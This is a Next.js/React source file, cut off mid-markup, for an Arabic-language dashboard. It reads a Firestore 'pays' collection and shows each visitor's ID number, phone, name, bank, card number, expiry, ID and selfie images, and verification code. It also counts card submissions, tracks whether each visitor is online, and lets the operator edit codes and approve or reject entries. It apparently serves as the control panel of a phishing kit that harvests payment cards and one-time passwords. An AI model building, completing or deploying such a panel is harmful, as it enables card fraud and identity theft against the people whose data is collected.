"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Bell,
  Search,
  Filter,
  RefreshCw,
  LogOut,
  CheckCircle,
  XCircle,
  Clock,
  Phone,
  User,
  Shield,
  Calendar,
  ChevronDown,
  AlertCircle,
  Eye,
  ImageIcon,
  X,
  Download,
  ZoomIn,
  ZoomOut,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
  DialogFooter,
} from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { onValue, ref } from "firebase/database"
import { auth, database, db } from "@/lib/firebase"
import { playNotificationSound } from "@/lib/actions"

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

interface Notification {
  id: string
  timestamp: string
  data: {
    idNumber: string
    authCode: string
    timestamp: string
    status: string
  }
  phone: string
}

function UserStatusBadge({ userId }: { userId: string }) {
  const [status, setStatus] = useState<string>("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state)
      } else {
        setStatus("unknown")
      }
    })

    return () => unsubscribe()
  }, [userId])

  return (
    <Badge
      variant="outline"
      className={`${status === "online" ? "bg-emerald-100 text-emerald-700 border-emerald-200" : "bg-red-100 text-red-700 border-red-200"} flex items-center gap-1.5 px-2 py-1`}
    >
      <span className={`w-2 h-2 rounded-full ${status === "online" ? "bg-emerald-500" : "bg-red-500"}`}></span>
      <span className="text-xs font-medium">{status === "online" ? "متصل" : "غير متصل"}</span>
    </Badge>
  )
}

const getStatusBadge = (status: string) => {
  switch (status) {
    case "approved":
      return (
        <Badge
          variant="outline"
          className="bg-emerald-100 text-emerald-700 border-emerald-200 flex items-center gap-1.5"
        >
          <CheckCircle className="h-3 w-3" />
          <span>مقبول</span>
        </Badge>
      )
    case "rejected":
      return (
        <Badge variant="outline" className="bg-red-100 text-red-700 border-red-200 flex items-center gap-1.5">
          <XCircle className="h-3 w-3" />
          <span>مرفوض</span>
        </Badge>
      )
    default:
      return (
        <Badge variant="outline" className="bg-amber-100 text-amber-700 border-amber-200 flex items-center gap-1.5">
          <Clock className="h-3 w-3" />
          <span>قيد الانتظار</span>
        </Badge>
      )
  }
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [message, setMessage] = useState<string | null>(null)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const [editingAuthCodes, setEditingAuthCodes] = useState<Record<string, string>>({})
  const [searchQuery, setSearchQuery] = useState("")
  const [activeFilter, setActiveFilter] = useState<string | null>(null)
  const [confirmDeleteId, setConfirmDeleteId] = useState<string | null>(null)
  const [selectedImages, setSelectedImages] = useState<{ images: string[]; currentIndex: number } | null>(null)
  const [imageZoom, setImageZoom] = useState(1)
  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  useEffect(() => {
    if (notifications.length > 0) {
      let result = [...notifications]

      // Apply search
      if (searchQuery) {
        const query = searchQuery.toLowerCase()
        result = result.filter(
          (notification) =>
            notification.data.idNumber.toLowerCase().includes(query) ||
            notification.phone.toLowerCase().includes(query) ||
            notification.data.authCode.toLowerCase().includes(query),
        )
      }

      // Apply filters
      if (activeFilter) {
        if (activeFilter === "pending" || activeFilter === "approved" || activeFilter === "rejected") {
          result = result.filter((notification) => notification.data.status === activeFilter)
        } else if (activeFilter === "hasCard") {
          result = result.filter((notification: any) => notification.cardNumber)
        } else if (activeFilter === "hasPersonal") {
          result = result.filter((notification: any) => notification.name)
        }
      }

      setFilteredNotifications(result)
    } else {
      setFilteredNotifications([])
    }
  }, [notifications, searchQuery, activeFilter])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as Notification[]
        playNotificationSound()

        // Update statistics
        updateStatistics(notificationsData)

        setNotifications(notificationsData)
        setFilteredNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const updateStatistics = (notificationsData: Notification[]) => {
    // Total visitors is the total count of notifications
    const totalCount = notificationsData.length

    // Card submissions is the count of notifications with card info
    const cardCount = notificationsData.filter((notification: any) => notification.cardNumber).length

    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
  }

  const handleAuthCodeChange = (notificationId: string, newAuthCode: string) => {
    setEditingAuthCodes((prev) => ({
      ...prev,
      [notificationId]: newAuthCode,
    }))
  }

  const updateAuthCode = async (notificationId: string) => {
    const newAuthCode = editingAuthCodes[notificationId]
    if (newAuthCode !== undefined) {
      try {
        const docRef = doc(db, "pays", notificationId)
        await updateDoc(docRef, {
          "data.authCode": newAuthCode,
        })

        // Update local state
        setNotifications((prev) =>
          prev.map((notification) =>
            notification.id === notificationId
              ? {
                  ...notification,
                  data: { ...notification.data, authCode: newAuthCode },
                }
              : notification,
          ),
        )

        // Remove from editing state
        setEditingAuthCodes((prev) => {
          const updated = { ...prev }
          delete updated[notificationId]
          return updated
        })

        showMessage("تم تحديث رمز التحقق بنجاح")
      } catch (error) {
        console.error("Error updating auth code:", error)
        showMessage("حدث خطأ أثناء تحديث رمز التحقق", "error")
      }
    }
  }

  const handleClearAll = async () => {
    setConfirmDeleteId("all")
  }

  const confirmClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
      showMessage("تم مسح جميع الإشعارات بنجاح")
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      showMessage("حدث خطأ أثناء مسح الإشعارات", "error")
    } finally {
      setIsLoading(false)
      setConfirmDeleteId(null)
    }
  }

  const handleDelete = async (id: string) => {
    setConfirmDeleteId(id)
  }

  const confirmDeleteNotification = async () => {
    if (!confirmDeleteId) return

    const id = confirmDeleteId
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
      showMessage("تم مسح الإشعار بنجاح")
    } catch (error) {
      console.error("Error hiding notification:", error)
      showMessage("حدث خطأ أثناء مسح الإشعار", "error")
    } finally {
      setConfirmDeleteId(null)
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        "data.status": state,
      })

      // Update local state
      setNotifications((prev) =>
        prev.map((notification) =>
          notification.id === id
            ? {
                ...notification,
                data: { ...notification.data, status: state },
              }
            : notification,
        ),
      )

      showMessage(state === "approved" ? "تم قبول الإشعار بنجاح" : "تم رفض الإشعار بنجاح")
    } catch (error) {
      console.error("Error updating notification status:", error)
      showMessage("حدث خطأ أثناء تحديث حالة الإشعار", "error")
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
    setConfirmDeleteId(null)
  }

  const showMessage = (text: string, type: "success" | "error" = "success") => {
    setMessage(text)
    setTimeout(() => {
      setMessage(null)
    }, 3000)
  }

  const resetFilters = () => {
    setSearchQuery("")
    setActiveFilter(null)
  }

  const handleImagePreview = (notification: Notification) => {
    const images: string[] = []
    const notificationData = notification as any

    // Collect all available images
    if (notificationData.idImage) images.push(notificationData.idImage)
    if (notificationData.cardImage) images.push(notificationData.cardImage)
    if (notificationData.selfieImage) images.push(notificationData.selfieImage)
    if (notificationData.frontIdImage) images.push(notificationData.frontIdImage)
    if (notificationData.backIdImage) images.push(notificationData.backIdImage)
    if (notificationData.images && Array.isArray(notificationData.images)) {
      images.push(...notificationData.images)
    }

    if (images.length > 0) {
      setSelectedImages({ images, currentIndex: 0 })
      setImageZoom(1)
    }
  }

  const closeImagePreview = () => {
    setSelectedImages(null)
    setImageZoom(1)
  }

  const nextImage = () => {
    if (selectedImages && selectedImages.currentIndex < selectedImages.images.length - 1) {
      setSelectedImages({
        ...selectedImages,
        currentIndex: selectedImages.currentIndex + 1,
      })
      setImageZoom(1)
    }
  }

  const prevImage = () => {
    if (selectedImages && selectedImages.currentIndex > 0) {
      setSelectedImages({
        ...selectedImages,
        currentIndex: selectedImages.currentIndex - 1,
      })
      setImageZoom(1)
    }
  }

  const downloadImage = () => {
    if (selectedImages) {
      const imageUrl = selectedImages.images[selectedImages.currentIndex]
      const link = document.createElement("a")
      link.href = imageUrl
      link.download = `notification-image-${selectedImages.currentIndex + 1}.jpg`
      document.body.appendChild(link)
      link.click()
      document.body.removeChild(link)
    }
  }

  const getImageCount = (notification: any) => {
    let count = 0
    if (notification.idImage) count++
    if (notification.cardImage) count++
    if (notification.selfieImage) count++
    if (notification.frontIdImage) count++
    if (notification.backIdImage) count++
    if (notification.images && Array.isArray(notification.images)) {
      count += notification.images.length
    }
    return count
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center justify-center">
        <RefreshCw className="h-10 w-10 text-gray-400 animate-spin mb-4" />
        <div className="text-lg font-medium text-gray-700">جاري التحميل...</div>
      </div>
    )
  }

  return (
    <div dir="rtl" className="min-h-screen bg-gray-50 text-gray-900">
      {/* Header */}
      <div className="bg-white border-b border-gray-200 sticky top-0 z-10">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center">
              <Bell className="h-6 w-6 text-purple-600 mr-2" />
              <h1 className="text-xl font-bold text-gray-900">لوحة الإشعارات</h1>
            </div>
            <div className="flex items-center gap-3">
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button variant="outline" size="icon" onClick={resetFilters}>
                      <RefreshCw className="h-4 w-4" />
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>إعادة تعيين الفلاتر</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>

              <Button
                variant="destructive"
                onClick={handleClearAll}
                disabled={notifications.length === 0}
                className="flex items-center gap-2"
                size="sm"
              >
                <Trash2 className="h-4 w-4" />
                <span className="hidden sm:inline">مسح الكل</span>
              </Button>

              <Button variant="outline" onClick={handleLogout} className="flex items-center gap-2" size="sm">
                <LogOut className="h-4 w-4" />
                <span className="hidden sm:inline">تسجيل الخروج</span>
              </Button>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
        {/* Statistics Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
          {/* Online Users Card */}
          <Card className="border-none shadow-sm">
            <CardContent className="p-6 flex items-center">
              <div className="rounded-full bg-blue-50 p-3 mr-4">
                <UserCheck className="h-6 w-6 text-blue-600" />
              </div>
              <div>
                <p className="text-sm text-gray-500">المستخدمين المتصلين</p>
                <p className="text-2xl font-bold">{onlineUsersCount}</p>
              </div>
            </CardContent>
          </Card>

          {/* Total Visitors Card */}
          <Card className="border-none shadow-sm">
            <CardContent className="p-6 flex items-center">
              <div className="rounded-full bg-emerald-50 p-3 mr-4">
                <Users className="h-6 w-6 text-emerald-600" />
              </div>
              <div>
                <p className="text-sm text-gray-500">إجمالي الزوار</p>
                <p className="text-2xl font-bold">{totalVisitors}</p>
              </div>
            </CardContent>
          </Card>

          {/* Card Submissions Card */}
          <Card className="border-none shadow-sm">
            <CardContent className="p-6 flex items-center">
              <div className="rounded-full bg-purple-50 p-3 mr-4">
                <CreditCard className="h-6 w-6 text-purple-600" />
              </div>
              <div>
                <p className="text-sm text-gray-500">معلومات البطاقات المقدمة</p>
                <p className="text-2xl font-bold">{cardSubmissions}</p>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Search and Filters */}
        <div className="mb-6 flex flex-col sm:flex-row gap-4">
          <div className="relative flex-1">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
            <Input
              placeholder="البحث عن رقم الهوية، رقم الهاتف، أو رمز التحقق..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="pl-10 bg-white border-gray-200"
            />
          </div>

          <div className="flex gap-2">
            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <Button variant="outline" className="flex items-center gap-2 bg-white">
                  <Filter className="h-4 w-4" />
                  <span>فلترة</span>
                  <ChevronDown className="h-4 w-4" />
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end" className="w-56">
                <DropdownMenuItem onClick={() => setActiveFilter("pending")} className="cursor-pointer">
                  قيد الانتظار
                </DropdownMenuItem>
                <DropdownMenuItem onClick={() => setActiveFilter("approved")} className="cursor-pointer">
                  مقبول
                </DropdownMenuItem>
                <DropdownMenuItem onClick={() => setActiveFilter("rejected")} className="cursor-pointer">
                  مرفوض
                </DropdownMenuItem>
                <DropdownMenuItem onClick={() => setActiveFilter("hasCard")} className="cursor-pointer">
                  لديه معلومات بطاقة
                </DropdownMenuItem>
                <DropdownMenuItem onClick={() => setActiveFilter("hasPersonal")} className="cursor-pointer">
                  لديه معلومات شخصية
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>

            {activeFilter && (
              <Button variant="ghost" onClick={() => setActiveFilter(null)} size="icon" className="h-10 w-10">
                <XCircle className="h-4 w-4" />
              </Button>
            )}
          </div>
        </div>

        {/* Status message */}
        {message && (
          <div className="mb-4 p-3 bg-emerald-50 border border-emerald-200 text-emerald-700 rounded-md flex items-center">
            <CheckCircle className="h-5 w-5 mr-2 flex-shrink-0" />
            <p>{message}</p>
          </div>
        )}

        {/* Tabs for different views */}
        <Tabs defaultValue="table" className="mb-6">
          <TabsList className="mb-4">
            <TabsTrigger value="table">جدول</TabsTrigger>
            <TabsTrigger value="cards">بطاقات</TabsTrigger>
          </TabsList>

          <TabsContent value="table">
            <Card className="border-none shadow-sm overflow-hidden">
              {filteredNotifications.length > 0 ? (
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead>
                      <tr className="bg-gray-50 border-b border-gray-200">
                        <th className="px-4 py-3 text-right font-medium text-gray-500 text-sm">الرقم</th>
                        <th className="px-4 py-3 text-right font-medium text-gray-500 text-sm">رمز التحقق</th>
                        <th className="px-4 py-3 text-right font-medium text-gray-500 text-sm">الهاتف</th>
                        <th className="px-4 py-3 text-right font-medium text-gray-500 text-sm">المعلومات</th>
                        <th className="px-4 py-3 text-right font-medium text-gray-500 text-sm">الصور</th>
                        <th className="px-4 py-3 text-right font-medium text-gray-500 text-sm">الحالة</th>
                        <th className="px-4 py-3 text-right font-medium text-gray-500 text-sm">الإجراءات</th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredNotifications.map((notification) => (
                        <tr key={notification.id} className="border-b border-gray-100 hover:bg-gray-50">
                          <td className="px-4 py-3 text-sm">{notification.data.idNumber || "غير معروف"}</td>
                          <td className="px-4 py-3">
                            <div className="flex items-center gap-2">
                              <input
                                type="text"
                                value={editingAuthCodes[notification.id] ?? notification.data.authCode}
                                onChange={(e) => handleAuthCodeChange(notification.id, e.target.value)}
                                className="px-2 py-1 text-sm border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent min-w-[100px]"
                                placeholder="رمز التحقق"
                              />
                              {editingAuthCodes[notification.id] !== undefined && (
                                <Button
                                  size="sm"
                                  variant="outline"
                                  onClick={() => updateAuthCode(notification.id)}
                                  className="h-7 px-2 text-xs"
                                >
                                  حفظ
                                </Button>
                              )}
                            </div>
                          </td>
                          <td className="px-4 py-3 text-sm">{notification.phone}</td>
                          <td className="px-4 py-3">
                            <div className="flex flex-wrap gap-2">
                              <Badge
                                variant="outline"
                                className={`rounded-md cursor-pointer ${(notification as any).name ? "bg-blue-50 text-blue-700 border-blue-200" : "bg-gray-100 text-gray-700 border-gray-200"}`}
                                onClick={() => handleInfoClick(notification, "personal")}
                              >
                                <User className="h-3 w-3 mr-1" />
                                {(notification as any).name ? "معلومات شخصية" : "لا يوجد معلومات"}
                              </Badge>
                              <Badge
                                variant="outline"
                                className={`rounded-md cursor-pointer ${(notification as any).cardNumber ? "bg-emerald-50 text-emerald-700 border-emerald-200" : "bg-gray-100 text-gray-700 border-gray-200"}`}
                                onClick={() => handleInfoClick(notification, "card")}
                              >
                                <CreditCard className="h-3 w-3 mr-1" />
                                {(notification as any).cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                              </Badge>
                            </div>
                          </td>
                          <td className="px-4 py-3 text-center">
                            {getImageCount(notification) > 0 ? (
                              <TooltipProvider>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Button
                                      variant="outline"
                                      size="sm"
                                      onClick={() => handleImagePreview(notification)}
                                      className="flex items-center gap-1 bg-blue-50 text-blue-700 border-blue-200 hover:bg-blue-100"
                                    >
                                      <Eye className="h-4 w-4" />
                                      <span className="text-xs">{getImageCount(notification)}</span>
                                    </Button>
                                  </TooltipTrigger>
                                  <TooltipContent>
                                    <p>عرض الصور ({getImageCount(notification)})</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            ) : (
                              <Badge variant="outline" className="bg-gray-100 text-gray-500 border-gray-200">
                                <ImageIcon className="h-3 w-3 mr-1" />
                                لا توجد صور
                              </Badge>
                            )}
                          </td>
                          <td className="px-4 py-3 text-center">{getStatusBadge(notification.data.status)}</td>
                          <td className="px-4 py-3 text-center">
                            <div className="flex justify-center gap-2">
                              {notification.data.status !== "approved" && (
                                <TooltipProvider>
                                  <Tooltip>
                                    <TooltipTrigger asChild>
                                      <Button
                                        variant="outline"
                                        size="sm"
                                        onClick={() => handleApproval("approved", notification.id)}
                                        className="bg-emerald-500 text-white hover:bg-emerald-600 border-emerald-500"
                                      >
                                        <CheckCircle className="h-4 w-4" />
                                      </Button>
                                    </TooltipTrigger>
                                    <TooltipContent>
                                      <p>قبول</p>
                                    </TooltipContent>
                                  </Tooltip>
                                </TooltipProvider>
                              )}

                              {notification.data.status !== "rejected" && (
                                <TooltipProvider>
                                  <Tooltip>
                                    <TooltipTrigger asChild>
                                      <Button
                                        variant="outline"
                                        size="sm"
                                        onClick={() => handleApproval("rejected", notification.id)}
                                        className="bg-red-500 text-white hover:bg-red-600 border-red-500"
                                      >
                                        <XCircle className="h-4 w-4" />
                                      </Button>
                                    </TooltipTrigger>
                                    <TooltipContent>
                                      <p>رفض</p>
                                    </TooltipContent>
                                  </Tooltip>
                                </TooltipProvider>
                              )}

                              <TooltipProvider>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Button
                                      variant="ghost"
                                      size="sm"
                                      onClick={() => handleDelete(notification.id)}
                                      className="text-red-500 hover:text-red-600 hover:bg-red-50"
                                    >
                                      <Trash2 className="h-4 w-4" />
                                    </Button>
                                  </TooltipTrigger>
                                  <TooltipContent>
                                    <p>حذف</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </div>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              ) : (
                <div className="text-center py-12">
                  <Bell className="h-12 w-12 text-gray-300 mx-auto mb-4" />
                  <h3 className="text-lg font-medium text-gray-900 mb-2">لا توجد إشعارات</h3>
                  <p className="text-gray-500 max-w-md mx-auto">
                    {searchQuery || activeFilter
                      ? "لا توجد نتائج تطابق معايير البحث أو الفلترة. حاول تغيير المعايير أو إعادة تعيين الفلاتر."
                      : "لا توجد إشعارات حالياً. ستظهر الإشعارات الجديدة هنا عند وصولها."}
                  </p>
                  {(searchQuery || activeFilter) && (
                    <Button variant="outline" onClick={resetFilters} className="mt-4">
                      إعادة تعيين الفلاتر
                    </Button>
                  )}
                </div>
              )}
            </Card>
          </TabsContent>

          <TabsContent value="cards">
            {filteredNotifications.length > 0 ? (
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                {filteredNotifications.map((notification) => (
                  <Card key={notification.id} className="border-none shadow-sm overflow-hidden">
                    <CardHeader className="pb-2 pt-4">
                      <div className="flex justify-between items-start">
                        <div>
                          <CardTitle className="text-base flex items-center gap-2">
                            <User className="h-4 w-4 text-gray-500" />
                            {notification.data.idNumber || "غير معروف"}
                          </CardTitle>
                          <CardDescription className="mt-1">
                            <Phone className="h-3 w-3 inline mr-1" />
                            {notification.phone}
                          </CardDescription>
                        </div>
                        <div className="flex items-center gap-2">
                          {getStatusBadge(notification.data.status)}
                          <UserStatusBadge userId={notification.id} />
                        </div>
                      </div>
                    </CardHeader>
                    <CardContent className="pb-4 space-y-4">
                      <div className="space-y-3">
                        <div>
                          <label className="text-sm font-medium text-gray-700 block mb-1">رمز التحقق</label>
                          <div className="flex items-center gap-2">
                            <input
                              type="text"
                              value={editingAuthCodes[notification.id] ?? notification.data.authCode}
                              onChange={(e) => handleAuthCodeChange(notification.id, e.target.value)}
                              className="px-2 py-1 text-sm border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent w-full"
                              placeholder="رمز التحقق"
                            />
                            {editingAuthCodes[notification.id] !== undefined && (
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => updateAuthCode(notification.id)}
                                className="h-7 px-2 text-xs whitespace-nowrap"
                              >
                                حفظ
                              </Button>
                            )}
                          </div>
                        </div>

                        <div className="flex flex-wrap gap-2">
                          <Badge
                            variant="outline"
                            className={`rounded-md cursor-pointer ${(notification as any).name ? "bg-blue-50 text-blue-700 border-blue-200" : "bg-gray-100 text-gray-700 border-gray-200"}`}
                            onClick={() => handleInfoClick(notification, "personal")}
                          >
                            <User className="h-3 w-3 mr-1" />
                            {(notification as any).name ? "معلومات شخصية" : "لا يوجد معلومات"}
                          </Badge>
                          <Badge
                            variant="outline"
                            className={`rounded-md cursor-pointer ${(notification as any).cardNumber ? "bg-emerald-50 text-emerald-700 border-emerald-200" : "bg-gray-100 text-gray-700 border-gray-200"}`}
                            onClick={() => handleInfoClick(notification, "card")}
                          >
                            <CreditCard className="h-3 w-3 mr-1" />
                            {(notification as any).cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                          </Badge>
                        </div>

                        {getImageCount(notification) > 0 && (
                          <div className="flex items-center justify-between py-2">
                            <span className="text-sm font-medium text-gray-700 flex items-center gap-2">
                              <ImageIcon className="h-4 w-4 text-gray-500" />
                              الصور المرفقة:
                            </span>
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => handleImagePreview(notification)}
                              className="flex items-center gap-1 bg-blue-50 text-blue-700 border-blue-200 hover:bg-blue-100"
                            >
                              <Eye className="h-4 w-4" />
                              عرض ({getImageCount(notification)})
                            </Button>
                          </div>
                        )}

                        <div className="text-xs text-gray-500 flex items-center">
                          <Clock className="h-3 w-3 mr-1" />
                          {(notification as any).createdDate &&
                            formatDistanceToNow(new Date((notification as any).createdDate), {
                              addSuffix: true,
                              locale: ar,
                            })}
                        </div>
                      </div>

                      <div className="flex gap-2 pt-2">
                        {notification.data.status !== "approved" && (
                          <Button
                            size="sm"
                            className="flex-1 bg-emerald-500 hover:bg-emerald-600 text-white"
                            onClick={() => handleApproval("approved", notification.id)}
                          >
                            <CheckCircle className="h-4 w-4 mr-1" />
                            قبول
                          </Button>
                        )}

                        {notification.data.status !== "rejected" && (
                          <Button
                            size="sm"
                            className="flex-1 bg-red-500 hover:bg-red-600 text-white"
                            onClick={() => handleApproval("rejected", notification.id)}
                          >
                            <XCircle className="h-4 w-4 mr-1" />
                            رفض
                          </Button>
                        )}

                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => handleDelete(notification.id)}
                          className="w-10 p-0 border-gray-200 text-gray-500 hover:text-red-500 hover:border-red-200"
                        >
                          <Trash2 className="h-4 w-4" />
                        </Button>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            ) : (
              <div className="text-center py-12 bg-white rounded-lg shadow-sm">
                <Bell className="h-12 w-12 text-gray-300 mx-auto mb-4" />
                <h3 className="text-lg font-medium text-gray-900 mb-2">لا توجد إشعارات</h3>
                <p className="text-gray-500 max-w-md mx-auto">
                  {searchQuery || activeFilter
                    ? "لا توجد نتائج تطابق معايير البحث أو الفلترة. حاول تغيير المعايير أو إعادة تعيين الفلاتر."
                    : "لا توجد إشعارات حالياً. ستظهر الإشعارات الجديدة هنا عند وصولها."}
                </p>
                {(searchQuery || activeFilter) && (
                  <Button variant="outline" onClick={resetFilters} className="mt-4">
                    إعادة تعيين الفلاتر
                  </Button>
                )}
              </div>
            )}
          </TabsContent>
        </Tabs>
      </div>

      {/* Info Dialog */}
      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-white text-gray-900 max-w-[90vw] md:max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-lg">
              {selectedInfo === "personal" ? (
                <>
                  <User className="h-5 w-5 text-blue-600" />
                  المعلومات الشخصية
                </>
              ) : selectedInfo === "card" ? (
                <>
                  <CreditCard className="h-5 w-5 text-emerald-600" />
                  معلومات البطاقة
                </>
              ) : (
                "معلومات عامة"
              )}
            </DialogTitle>
            <DialogDescription>
              {selectedNotification && (
                <span className="text-sm text-gray-500">
                  {selectedNotification.data.idNumber} • {selectedNotification.phone}
                </span>
              )}
            </DialogDescription>
          </DialogHeader>

          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-3 p-4 bg-gray-50 rounded-lg">
              {selectedNotification.id && (
                <div className="flex justify-between items-center py-2 border-b border-gray-200">
                  <span className="font-medium text-gray-700 flex items-center gap-2">
                    <Shield className="h-4 w-4 text-gray-500" />
                    رقم الهوية:
                  </span>
                  <span className="text-gray-900">{selectedNotification.id}</span>
                </div>
              )}
              {(selectedNotification as any).name && (
                <div className="flex justify-between items-center py-2 border-b border-gray-200">
                  <span className="font-medium text-gray-700 flex items-center gap-2">
                    <User className="h-4 w-4 text-gray-500" />
                    الاسم:
                  </span>
                  <span className="text-gray-900">{(selectedNotification as any).name}</span>
                </div>
              )}
              {selectedNotification.phone && (
                <div className="flex justify-between items-center py-2 border-b border-gray-200">
                  <span className="font-medium text-gray-700 flex items-center gap-2">
                    <Phone className="h-4 w-4 text-gray-500" />
                    الهاتف:
                  </span>
                  <span className="text-gray-900 font-medium">{selectedNotification.phone}</span>
                </div>
              )}
            </div>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-3 p-4 bg-gray-50 rounded-lg">
              {(selectedNotification as any).bank && (
                <div className="flex justify-between items-center py-2 border-b border-gray-200">
                  <span className="font-medium text-gray-700 flex items-center gap-2">
                    <CreditCard className="h-4 w-4 text-gray-500" />
                    البنك:
                  </span>
                  <span className="font-semibold text-gray-900">{(selectedNotification as any).bank}</span>
                </div>
              )}
              {(selectedNotification as any).cardNumber && (
                <div className="flex justify-between items-center py-2 border-b border-gray-200">
                  <span className="font-medium text-gray-700 flex items-center gap-2">
                    <CreditCard className="h-4 w-4 text-gray-500" />
                    رقم البطاقة:
                  </span>
                  <div className="font-semibold text-gray-900" dir="ltr">
                    {(selectedNotification as any).prefix && (
                      <Badge variant="outline" className="bg-blue-50 text-blue-700 border-blue-200 mr-1">
                        {(selectedNotification as any).prefix}
                      </Badge>
                    )}
                    <Badge variant="outline" className="bg-emerald-50 text-emerald-700 border-emerald-200">
                      {(selectedNotification as any).cardNumber}
                    </Badge>
                  </div>
                </div>
              )}
              {((selectedNotification as any).year ||
                (selectedNotification as any).month ||
                (selectedNotification as any).cardExpiry) && (
                <div className="flex justify-between items-center py-2 border-b border-gray-200">
                  <span className="font-medium text-gray-700 flex items-center gap-2">
                    <Calendar className="h-4 w-4 text-gray-500" />
                    تاريخ الانتهاء:
                  </span>
                  <span className="font-semibold text-gray-900">
